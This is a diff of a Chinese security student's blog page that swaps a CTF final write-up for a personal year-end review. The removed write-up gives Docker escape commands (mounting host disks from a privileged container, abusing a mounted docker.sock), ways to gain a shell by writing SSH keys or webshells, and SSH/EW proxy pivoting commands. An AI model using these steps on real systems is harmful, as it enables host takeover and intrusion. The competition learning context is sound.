@@ -5,16 +5,15 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>3CTF总决赛 - RGDZ&#39;s blog</title>
+    <title>个人年度总结 - RGDZ&#39;s blog</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="CTF PWN 恶意文件分析 编程 WEB,"> 
-    <meta name="description" content="RGDZ&#39;s blog,3CTF总决赛总结前言:
-这次比赛还是收获很多，也很感谢举办方提供的环境和服务，这里给举办方点个赞先。
+    <meta name="description" content="RGDZ&#39;s blog,个人年度总结前言：
+难得有时间，正好整理整理和大家分享一下自己这一年都做了什么，学到什么。
 
-失误：
-第一，成功逃逸docker拿下主机权限后只提交了根目录下的flag，没有在find一,"> 
+起点：大一的寒假开始，听团队的师兄们说没人做和二进制漏洞相关的题目，正好我想着我来试试，开始接触PWN这,"> 
     <meta name="author" content="RGDZ"> 
     <link rel="alternative" href="atom.xml" title="RGDZ&#39;s blog" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -47,7 +46,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://rgdz-gzu.github.io">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">3CTF总决赛</h3>
+        <h3 class="subtitle">个人年度总结</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" target="_blank" rel="noopener" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -72,30 +71,30 @@
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url(https://p.ssl.qhimg.com/t01fa7e5314f62745c3.jpg);">
+                url(/img/cover.jpg);">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="/categories/CTF"><b>「
-                    </b>CTF<b> 」</b></a>
+                <a href="/categories/杂记"><b>「
+                    </b>杂记<b> 」</b></a>
                 
-                十二月 04, 2019
+                一月 04, 2020
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/2019/12/04/3CTF%E6%80%BB%E5%86%B3%E8%B5%9B/" title="3CTF总决赛" class="">3CTF总决赛</a>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/04/%E4%B8%AA%E4%BA%BA%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" title="个人年度总结" class="">个人年度总结</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    4.7k
+                    3.6k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    4 mins.
+                    3 mins.
                 </span>
                 
                 
@@ -108,7 +107,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/Docker%E9%80%83%E9%80%B8/" rel="tag">Docker逃逸</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/WEB%E6%94%BB%E9%98%B2/" rel="tag">WEB攻防</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" rel="tag">中间件漏洞</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a></li></ul>
             
         </div>
     </div>
@@ -129,81 +128,21 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="3CTF总决赛总结"><a href="#3CTF总决赛总结" class="headerlink" title="3CTF总决赛总结"></a>3CTF总决赛总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote>
-<p>这次比赛还是收获很多，也很感谢举办方提供的环境和服务，这里给举办方点个赞先。</p>
+            <h1 id="个人年度总结"><a href="#个人年度总结" class="headerlink" title="个人年度总结"></a>个人年度总结</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote>
+<p>难得有时间，正好整理整理和大家分享一下自己这一年都做了什么，学到什么。</p>
 </blockquote>
-<h2 id="失误："><a href="#失误：" class="headerlink" title="失误："></a>失误：</h2><blockquote>
-<p>第一，成功逃逸docker拿下主机权限后只提交了根目录下的flag，没有在find一下，这个细节确实导致没能取得更好的成绩，这个分段的大部分都没有做到逃逸所以很吃亏。</p>
-</blockquote>
-<blockquote>
-<p>第二，前期准备资料都在如何打域控，提权，免杀维持权限这一块，没想着第二环节就是docker逃逸，导致于打下服务以后一半时间只能等着排队申请上网机，之前也没有好好看过docker逃逸相关的资料。</p>
-</blockquote>
-<blockquote>
-<p>第三，意识不足，反应不够快，开局给的中间件漏洞考点，其实不难，kali足够分分解决问题，但在使用msf攻击时总不能反弹会回主机shell，没及时反应可能是打的docker环境，直到给了tips才想着去改脚本手动执行命令，这也导致浪费了上午三个小时的时间，直接导致docker逃逸成功后没有足够的时间来上代理，同时这里也存在一个失误，拿下主机后只想着写webshell，传ew来挂代理再进一步内网渗透，但写webshell的目录一直没找对，都没意识到可以直接写ssh公钥来操作，也是导致没能取得更好成绩的一个失误点，而且根据举办方放出来的tips，内网的下一个目标就是一台redis主从复制漏洞利用，这个明明手上是有exp的，但docker逃逸浪费太多时间，还没来得及进一步攻击就Gameover</p>
-</blockquote>
-<h2 id="学到的姿势"><a href="#学到的姿势" class="headerlink" title="学到的姿势:"></a>学到的姿势:</h2><h3 id="特权容器逃逸"><a href="#特权容器逃逸" class="headerlink" title="特权容器逃逸:"></a>特权容器逃逸:</h3><blockquote>
-<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
-</blockquote>
-<p>说这么多，其实操作起来特别简单:<br>当时没能截图下来我只能大概说一下</p>
-<pre><code class="shell">fdisk -l //查看当前机器的磁盘信息 这一步很重要，相当于逃逸前的信息收集
-ls /dev 
-// 查看当前驱动文件，会发现很多文件，但大多数我们不需要关心，我们仅仅关心上面一个命令执行后说显示的磁盘文件
-mkdir abc//准备一个空目录来做挂载
-mount /dev/&lt;target&gt; /abc //注意挂载target我们只关心物理磁盘</code></pre>
-<h3 id="挂载配置不当时的逃逸情况："><a href="#挂载配置不当时的逃逸情况：" class="headerlink" title="挂载配置不当时的逃逸情况："></a>挂载配置不当时的逃逸情况：</h3><blockquote>
-<p>docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。</p>
-</blockquote>
-<blockquote>
-<p>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。</p>
-</blockquote>
-<blockquote>
-<p>因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。<br>具体操作步骤:</p>
-</blockquote>
-<pre><code class="shell">apt-get install docker.io //在docker内安装client，必须
-docker -H unix:///host/var/run/docker.sock info //可以查看宿主机docker信息
-docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash //挂载主机根目录，完成这一步就成功逃逸了 `aa`目录就是就是主机根目录</code></pre>
-<p>补充:</p>
-<blockquote>
-<p>完成上述步骤后，我们仅仅完成逃逸的50%，此时只有该主机磁盘的读写权限，这时我们需要想办法来获取shell,比赛时这里吃亏了，因为没经验，意识不够。我总结一下三个思路</p>
-<ul>
-<li>往root目录写ssh公钥，这里注意有可能需要改文件权限，第二天师傅们说的，600可以试试</li>
-<li>如果主机开着web服务，可以去web服务目录里面写webshell，也要注意执行权限</li>
-<li>看看.shadow文件可以不可以操作来改密码</li>
-</ul>
-</blockquote>
-<p>剩下一些利用poc来提权的基本操作性比较简单不在重复，都可以直接弹shell的，对了最近出的CVE-2019-5736，利用runc来实现docker逃逸，是需要主机交互的，当时比赛没法利用，脏牛的poc内核版本不对，也没法打，哈哈所以详细记录一下上面的姿势</p>
-<h3 id="关于内网渗透时挂代理"><a href="#关于内网渗透时挂代理" class="headerlink" title="关于内网渗透时挂代理:"></a>关于内网渗透时挂代理:</h3><blockquote>
-<ul>
-<li>正向代理（-L）：相当于 iptable 的 port forwarding</li>
-<li>反向代理（-R）：相当于 frp 或者 ngrok</li>
-<li>socks5 代理（-D）：相当于 ss/ssr</li>
-</ul>
-</blockquote>
-<p>可以利用姿势:</p>
-<pre><code class="shell">// 正向代理
-ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC
-ssh -L 0.0.0.0:PortA:HostC:PortC  user@HostB
-
-// 反向代理
-ssh -R HostC:PortC:HostB:PortB  user@HostC
-
-// 本地 socks5 代理(推荐)
-ssh -D localhost:1080  HostB</code></pre>
-<p>EW操作<a href="./ew.zip">ew</a></p>
-<pre><code class="shell">unzip ew.zip
-file /sbin/init (查看linux位数)
-chmod 777 ew_for_Linux32
-./ew_for_Linux32 -s ssocksd -l 2333 (侦听0.0.0.0:2333)
-netstat -pantu|grep 2333 (查看是否侦听成功)</code></pre>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote>
-<p>第二天看见RedTeam负责人吴鹏老师放出完整网络拓扑图后，不得不说自己还是太菜了.<br><img src="./%E6%8B%93%E6%89%91%E5%9B%BE-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84.jpg" alt="拓扑图-攻击路径"></p>
-</blockquote>
-<blockquote>
-<p>我仅仅完成入口外部服务区的攻击，整个内网环境都还没看到，听完师傅们讲解思路后确实还是学到很多东西。SSH作用很强大，且基本为Linux系统标配，有辅助提权获取shell的操作，写入公钥可免密登录，-D参数可以挂代理。<br>docker逃逸基本操作，特权容器可挂载物理磁盘，挂载配置不当，docker. sock逃逸，脏牛vsdo漏洞逃逸，今年最新cve 2019-5376 runc漏洞，但这个漏洞利用需要主机的交互。<br>最后放一张此次比赛全体师傅们和老师评委的大合影，嘿嘿。<br><img src="./%E5%90%88%E5%BD%B1.jpg" alt="合影"></p>
-</blockquote>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><blockquote>
-<p><a href="https://www.anquanke.com/post/id/179623" target="_blank" rel="noopener">安全客-Docker逃逸初探</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82955196" target="_blank" rel="noopener">web狗要懂的内网端口转发</a><br><a href="https://zhuanlan.zhihu.com/p/57630633" target="_blank" rel="noopener">SSH 命令的三种代理功能（-L/-R/-D)</a></p>
-</blockquote>
+<h2 id="起点："><a href="#起点：" class="headerlink" title="起点："></a>起点：</h2><p>大一的寒假开始，听团队的师兄们说没人做和二进制漏洞相关的题目，正好我想着我来试试，开始接触PWN这个东西，在学习这个玩意的时候确实还是遇见很多坑，包括现在，当然比当初好了很多，这里回顾了一篇自己之前写了一篇总结文章，<br><img src="./img/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93.png" alt="pwn栈溢出总结"></p>
+<p>其中在自己搭环境的发现每次练习一个题，都得手动去部署题目部署很麻烦，引发了自己做一套平台的想法，又花了三个星期的时间，捣鼓出一套自动化部署pwn题的平台<br><img src="./img/%E5%B9%B3%E5%8F%B01.png" alt="平台1"></p>
+<p><img src="./img/%E5%B9%B3%E5%8F%B02.png" alt="平台2"></p>
+<p>可惜后来手误操作，源码仓库被我删掉了，不过在写平台三个星期里，我学习了flask框架的使用，同时结合自己之前学习django对web开发有了更深一步的了解</p>
+<h2 id="大一下"><a href="#大一下" class="headerlink" title="大一下:"></a>大一下:</h2><p>开学的前一天，突然莫名接了一个微信小程序开发的外包项目，当时喝了点酒，开价开少了，为啥嘞，因为我写了两遍，第一遍和朋友一起搞，没协调清楚，后期维护出一堆bug，所以重构一遍，完全自己一个前后端，到部署，以及数据库加密的实现全是自己一个人干，其中又学到很多东西，包括数据模型的建立，同时一个mysql数库的操作，一个mongodb的操作，就是钱拿少了，不过后面和客户联系，他们是拿去参赛，最后获得国赛二等奖，我还是挺(C)高（N）兴(M)的，说好的烟钱都没给我。<br>4月中旬开始基本上都是在打比赛，搞开发，先是DDCTF，最后以排名169的成绩收尾，还是太菜了，毕竟刚刚开始比较正式打这个比赛，其中学会了反序列化漏洞，而且当时的代码我审计了一天一夜，所以感触特别深，然后这学期用它的原理出个题赚了1680，打完DD就是国赛，飞了重庆，没能飞成都有点可惜，这个比赛我当时觉得我真尽力了，解题分数不算高，线上web0解，线下两天只解了一道，第二道意识不够差一点，最后靠着我花一周的时间出的题拿的高分，弄了个国赛二等奖，幸亏寒假搞的开发，出题的这一周学会了docker的使用，以及自己编写docker-compose.yml文件来自动化部署，这个后面发给客户时也用上了，以及redis数据库的基本使用，和未授权访问的原理，以及了解了一个数据持久化，，同时对linux的操作更熟练了，特别是权限控制，回头发现就特别简单，但能完出花样的姿势还是有很多没看。</p>
+<h2 id="暑期："><a href="#暑期：" class="headerlink" title="暑期："></a>暑期：</h2><p>眨眨眼就到7月了，考完试军训开始了，军训这段时间，真的感觉是我20年来过得最难受的7月，暂时没有之一，不是因为军训有多累，而是某些事情所导致，这里不多谈（喝酒，喝酒）。<br>8月真的和7月比起来天上地下之分，运气好去拿到名额去参加了CTP,认识一堆师傅，同时也对整个内网攻击，和漏洞利用，有了一个初步的了解，（端口是万恶之源）大师傅说的，默默记下来，这里比较好玩，作为导师代表的大师傅，说话语速和当时作为学生代表的我差不多，但他说我比他慢，我不服，第一次遇见有说话语速和我一样的，大师傅很厉害，新西兰一套海景带花园别墅，3个星期赚60万的大佬，膜拜膜拜。</p>
+<h2 id="大二上："><a href="#大二上：" class="headerlink" title="大二上："></a>大二上：</h2><p>9月份，和朋友搞了个数学建模大赛，我们当时作为大一生报的名，后面还搞了个省级二等奖，感觉也不错了，当时我复制做数据处理，我也没学过这方面的东西，现学现用，处理一千多万的GPS数据，第一次几个小时没跑出来，第二次40分钟，第三次10分钟，我全是自己写脚本来跑，没用任何现成的工具。这个感觉还是可以吹一下，哈哈。<br>10月，请了一个周的假去了上海看GeekPWN，参观了东方明珠，又认识几个师傅，一起吃了顿饭，不得不说，上海物价确实高。<br>11月，打进360杯职业赛决赛，飞了西安，看了古城墙，确实历史文化氛围，在回民街被坑，就比较难受了，3C有点可惜，我做出了虚拟机逃逸，但没find flag 吃大亏了，还是意识不够，不然搞不好二等奖都有了 3000块奖金，最后只得500，可惜了。<br>12月，考四级，多不说，只有比上次好就行了，至少我比上次多付出了一点呀，然后就是i春秋圣诞挑战赛，tm就是昨天，原本稳了两天前十的我，最后一天大家都py,一个逆向，一秒5人解，神仙，不过还好见识到了去花指令的操作，说起这个，我记得11月似乎开始研究恶意代码分析，哦也是前天，过了微步的一面，计划考完试和hr联系时间去北京面试，听说公司包车费，不过其中问的一些问题我确实还不太清楚，这里之前写了一篇文章记录下来，回头把几个点给补上</p>
+<p><img src="./img/%E9%9D%A2%E8%AF%95.png" alt="面试"></p>
+<p>最后前两天做了关于响尾蛇APT的样本分析，与空白师傅一起弄完了关于该组织的样本分析年度总结报告。<br><img src="./img/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A1.png" alt="APT分析报告1"></p>
+<p><img src="./img/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A2.png" alt="APT分析报告2"></p>
+<p>该报告详见：<br><a href="https://mp.weixin.qq.com/s?__biz=MzUyNzk2NDcwMw==&mid=2247484380&idx=1&sn=ed7cb176fec030cb6205f5ff7a453c39&scene=21#wechat_redirect" target="_blank" rel="noopener">GCOW官方微信公众号</a><br><a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2357" target="_blank" rel="noopener">微步在线X情报社区</a><br><a href="https://mp.weixin.qq.com/s/1_jyp2e8i10xmxBd9Dyxqg" target="_blank" rel="noopener">腾讯御见威胁情报中心-威胁情报周报</a><br><a href="https://mp.weixin.qq.com/s/Myho3ZvxXcd0TWhv1XR-fw" target="_blank" rel="noopener">奇安信威胁情报中心-每周威胁情报解读</a></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>基本上，这一年我就是这样过来的，比较大的变化是，我越来越像是夜猫子了，工作时间，怎么都变成了晚上，调一道逆向，能调到凌晨，发现晚上工作才有灵感。哈哈。<br>其实回头过来一想，自己一年，也还是学到不少东西，但记录下来的太少，还是得养成最少三天一篇文章的习惯。<br>看上去感觉似乎自己过的还算充实，但不知为何总感觉很失落，感觉还是有些迷茫，似乎技术上学了些东西，但学校的课程几乎没怎么听，概率论估计出问题了，下周还得考大物，乘着今天又时间，更新补起。</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -249,7 +188,7 @@ netstat -pantu|grep 2333 (查看是否侦听成功)</code></pre>
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>目录</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#3CTF总决赛总结"><span class="toc-number">1.</span> <span class="toc-text">3CTF总决赛总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#失误："><span class="toc-number">1.2.</span> <span class="toc-text">失误：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学到的姿势"><span class="toc-number">1.3.</span> <span class="toc-text">学到的姿势:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#特权容器逃逸"><span class="toc-number">1.3.1.</span> <span class="toc-text">特权容器逃逸:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#挂载配置不当时的逃逸情况："><span class="toc-number">1.3.2.</span> <span class="toc-text">挂载配置不当时的逃逸情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于内网渗透时挂代理"><span class="toc-number">1.3.3.</span> <span class="toc-text">关于内网渗透时挂代理:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">1.4.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.5.</span> <span class="toc-text">参考:</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#个人年度总结"><span class="toc-number">1.</span> <span class="toc-text">个人年度总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#起点："><span class="toc-number">1.2.</span> <span class="toc-text">起点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大一下"><span class="toc-number">1.3.</span> <span class="toc-text">大一下:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暑期："><span class="toc-number">1.4.</span> <span class="toc-text">暑期：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大二上："><span class="toc-number">1.5.</span> <span class="toc-text">大二上：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">1.6.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol>
                 </div>
             </div>
             
